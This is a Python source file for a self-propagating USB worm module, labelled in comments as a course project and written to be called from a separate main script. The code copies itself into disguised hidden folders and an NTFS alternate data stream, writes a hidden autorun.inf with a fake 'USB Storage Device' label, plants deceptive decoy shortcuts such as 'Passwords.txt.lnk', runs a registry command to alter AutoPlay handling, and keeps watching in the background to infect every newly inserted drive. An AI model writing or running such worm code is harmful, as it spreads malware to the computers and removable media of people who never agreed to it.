import os
import sys
import shutil
import time
import threading
import platform
import subprocess
from pathlib import Path

class USBReplicator:
    def __init__(self, worm_path=None):
        self.worm_path = worm_path or sys.argv[0]
        self.worm_name = os.path.basename(self.worm_path)
        self.monitoring = False
        
        # According to project spec: "hidden copy with autorun trigger"
        self.hidden_folders = [
            "SystemVolumeInformation",
            "$RECYCLE.BIN",
            "Config.Msi",
            "Windows.old",
            "Temporary Internet Files"
        ]

    def detect_usb_drives(self):
        """Detect USB drives - PROJECT SPEC: 'Detecting inserted USB drives'"""
        drives = []
        
        if platform.system() == "Windows":
            # Windows-specific detection
            import ctypes
            import string
            
            kernel32 = ctypes.windll.kernel32
            
            for drive in string.ascii_uppercase:
                path = f"{drive}:\\"
                if os.path.exists(path):
                    try:
                        # Check if it's removable (USB)
                        drive_type = kernel32.GetDriveTypeW(path)
                        
                        # DRIVE_REMOVABLE = 2, DRIVE_CDROM = 5 (sometimes USB)
                        if drive_type == 2:
                            drives.append(path)
                        # Also check for network drives that might be USB
                        elif drive_type == 4:  # DRIVE_REMOTE
                            # Could be USB shared as network
                            drives.append(path)
                    except:
                        if drive != "C:":  # Assume non-C drives might be USB
                            drives.append(path)
        else:
            # Linux/Mac detection
            mount_points = ["/media", "/mnt", "/run/media", "/Volumes"]
            for mount in mount_points:
                if os.path.exists(mount):
                    try:
                        for item in os.listdir(mount):
                            full_path = os.path.join(mount, item)
                            if os.path.ismount(full_path):
                                drives.append(full_path)
                    except:
                        pass
        
        return drives

    def create_hidden_copy(self, usb_path):
        """
        PROJECT SPEC: 'creating a hidden copy of the malware'
        Create multiple hidden copies in different locations
        """
        successes = []
        
        # Method 1: Hidden system folder (Windows)
        if platform.system() == "Windows":
            for hidden_folder in self.hidden_folders:
                try:
                    hidden_dir = os.path.join(usb_path, hidden_folder)
                    os.makedirs(hidden_dir, exist_ok=True)
                    
                    # Copy worm
                    worm_copy = os.path.join(hidden_dir, f"System32_{self.worm_name}")
                    shutil.copy2(self.worm_path, worm_copy)
                    
                    # Hide it
                    self.make_hidden(hidden_dir)
                    self.make_hidden(worm_copy)
                    
                    successes.append(worm_copy)
                    print(f"[USB] Hidden copy: {worm_copy}")
                except:
                    continue
        
        # Method 2: Alternate Data Streams (NTFS only)
        if platform.system() == "Windows":
            try:
                ads_path = os.path.join(usb_path, "desktop.ini:malware.exe")
                with open(ads_path, 'wb') as f:
                    with open(self.worm_path, 'rb') as src:
                        f.write(src.read())
                successes.append(ads_path)
                print(f"[USB] ADS copy: {ads_path}")
            except:
                pass
        
        # Method 3: Regular hidden file
        try:
            hidden_name = f".{self.worm_name}" if platform.system() != "Windows" else f"{self.worm_name}"
            hidden_path = os.path.join(usb_path, hidden_name)
            shutil.copy2(self.worm_path, hidden_path)
            
            if platform.system() == "Windows":
                self.make_hidden(hidden_path)
            
            successes.append(hidden_path)
            print(f"[USB] Dot-file copy: {hidden_path}")
        except:
            pass
        
        return successes

    def create_autorun_trigger(self, usb_path, worm_copies):
        """
        PROJECT SPEC: 'with an autorun trigger'
        Create autorun.inf for automatic execution
        """
        if platform.system() != "Windows":
            print("[USB] Autorun only works on Windows")
            return False
        
        try:
            autorun_path = os.path.join(usb_path, "autorun.inf")
            
            with open(autorun_path, 'w') as f:
                f.write("[autorun]\n")
                f.write("; USB Worm - Educational Project\n")
                f.write("; Course: Introduction to Cybersecurity\n\n")
                
                # Open action (runs when USB is opened)
                if worm_copies:
                    f.write(f'open={os.path.basename(worm_copies[0])}\n')
                    f.write(f'shell\\open\\command={os.path.basename(worm_copies[0])}\n')
                
                # AutoPlay actions
                f.write("shell\\autoplay\\command=Windows Explorer\n")
                f.write("shell\\autoplay=Open folder to view files\n")
                
                # Icon to make it look normal
                f.write("icon=shell32.dll,4\n")
                f.write("label=USB Storage Device\n")
                
                # Hidden execution
                f.write("shellexecute={}\n".format(os.path.basename(worm_copies[0]) if worm_copies else ""))
                f.write("action=Open folder to view files\n")
            
            # Make autorun.inf hidden too
            self.make_hidden(autorun_path)
            
            # Also create desktop.ini for folder customization
            desktop_ini = os.path.join(usb_path, "desktop.ini")
            with open(desktop_ini, 'w') as f:
                f.write("[.ShellClassInfo]\n")
                f.write("IconResource=shell32.dll,4\n")
                f.write("ConfirmFileOp=0\n")
                f.write("NoSharing=1\n")
            
            self.make_hidden(desktop_ini)
            self.make_system(desktop_ini)
            
            print(f"[USB] Autorun trigger created: {autorun_path}")
            return True
            
        except Exception as e:
            print(f"[USB] Autorun creation failed: {e}")
            return False

    def make_hidden(self, path):
        """Make file/folder hidden (Windows)"""
        if platform.system() == "Windows":
            try:
                import ctypes
                # FILE_ATTRIBUTE_HIDDEN = 2
                # FILE_ATTRIBUTE_SYSTEM = 4
                ctypes.windll.kernel32.SetFileAttributesW(str(path), 6)  # Hidden + System
                return True
            except:
                return False
        else:
            # Linux/Mac - dot prefix already hides it
            return True

    def make_system(self, path):
        """Make file system (Windows)"""
        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(str(path), 4)  # System
                return True
            except:
                return False
        return False

    def create_decoy_files(self, usb_path):
        """Create decoy files to trick users"""
        try:
            # Create folder structure
            folders = ["Documents", "Photos", "Work", "Personal"]
            for folder in folders:
                folder_path = os.path.join(usb_path, folder)
                os.makedirs(folder_path, exist_ok=True)
                
                # Create fake files
                decoys = {
                    "Documents": ["Resume.pdf.lnk", "Tax_Return.xlsx.lnk", "Contract.docx.lnk"],
                    "Photos": ["Vacation_2025.jpg.lnk", "Family.jpg.lnk"],
                    "Work": ["Presentation.ppt.lnk", "Report.pdf.lnk"],
                    "Personal": ["Passwords.txt.lnk", "Diary.txt.lnk"]
                }
                
                if folder in decoys:
                    for file in decoys[folder]:
                        file_path = os.path.join(folder_path, file)
                        with open(file_path, 'w') as f:
                            f.write("Shortcut to missing file\n")
                        
                        if platform.system() == "Windows":
                            self.make_hidden(file_path)
            
            print("[USB] Decoy files created")
            return True
        except Exception as e:
            print(f"[USB] Decoy creation failed: {e}")
            return False

    def infect_usb_drive(self, usb_path):
        """Complete infection of a USB drive"""
        print(f"\n[USB] Infecting drive: {usb_path}")
        
        # 1. Create hidden copies (Project Spec)
        print("[USB] Creating hidden copies...")
        hidden_copies = self.create_hidden_copy(usb_path)
        
        if not hidden_copies:
            print("[USB] Failed to create hidden copies")
            return False
        
        # 2. Create autorun trigger (Project Spec)
        print("[USB] Creating autorun trigger...")
        autorun_success = self.create_autorun_trigger(usb_path, hidden_copies)
        
        if not autorun_success:
            print("[USB] Warning: Autorun creation failed")
        
        # 3. Create decoy files (Bonus)
        print("[USB] Creating decoy files...")
        self.create_decoy_files(usb_path)
        
        # 4. Disable Windows AutoPlay protection (if possible)
        if platform.system() == "Windows":
            try:
                # Try to disable AutoPlay warning
                cmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoplayHandlers" /v DisableAutoplay /t REG_DWORD /d 1 /f'
                subprocess.run(cmd, shell=True, capture_output=True)
            except:
                pass
        
        print(f"[USB] Infection complete for {usb_path}")
        return True

    def monitor_and_infect(self, interval=2):
        """
        Continuously monitor for new USB drives
        PROJECT SPEC: 'Detecting inserted USB drives'
        """
        self.monitoring = True
        known_drives = set(self.detect_usb_drives())
        
        print("[USB] Monitoring for USB drives...")
        print("[USB] Insert a USB drive to see infection")
        
        try:
            while self.monitoring:
                current_drives = set(self.detect_usb_drives())
                new_drives = current_drives - known_drives
                
                for drive in new_drives:
                    print(f"[USB] NEW USB DETECTED: {drive}")
                    self.infect_usb_drive(drive)
                
                removed_drives = known_drives - current_drives
                if removed_drives:
                    print(f"[USB] Drives removed: {removed_drives}")
                
                known_drives = current_drives
                time.sleep(interval)
                
        except KeyboardInterrupt:
            print("\n[USB] Monitoring stopped")
        except Exception as e:
            print(f"[USB] Monitoring error: {e}")

    def infect_usb(self):
        """
        Main function - called by leader's main.py
        Infects all current USB drives and starts monitoring
        """
        print("[*] USB Drive Infection - Starting")
        
        # Get current USB drives
        current_drives = self.detect_usb_drives()
        print(f"[*] Found {len(current_drives)} USB drive(s)")
        
        # Infect all current drives
        infected_count = 0
        for drive in current_drives:
            if self.infect_usb_drive(drive):
                infected_count += 1
            time.sleep(1)  # Rate limiting
        
        # Start monitoring in background thread
        monitor_thread = threading.Thread(
            target=self.monitor_and_infect,
            daemon=True,
            name="USB-Monitor"
        )
        monitor_thread.start()
        
        print(f"\n[*] USB Infection Results:")
        print(f"[*] Infected {infected_count}/{len(current_drives)} drives")
        print(f"[*] Monitoring active - will infect new USB drives automatically")
        print(f"[*] Project Spec Met: ✓ Hidden copies ✓ Autorun triggers")
        
        return infected_count > 0

# Main function for leader to call
def infect_usb():
    """
    Leader calls this from main.py:
    from usb_replication import infect_usb
    infect_usb()
    """
    replicator = USBReplicator()
    return replicator.infect_usb()

if __name__ == "__main__":
    # Demo mode
    print("USB DRIVE INFECTION - EDUCATIONAL PROJECT")
    print("=" * 60)
    print("Project Spec: 'Detecting inserted USB drives and creating")
    print("a hidden copy of the malware with an autorun trigger'")
    print("=" * 60)
    
    infect_usb()
    
    # Keep running to show monitoring
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Demo complete")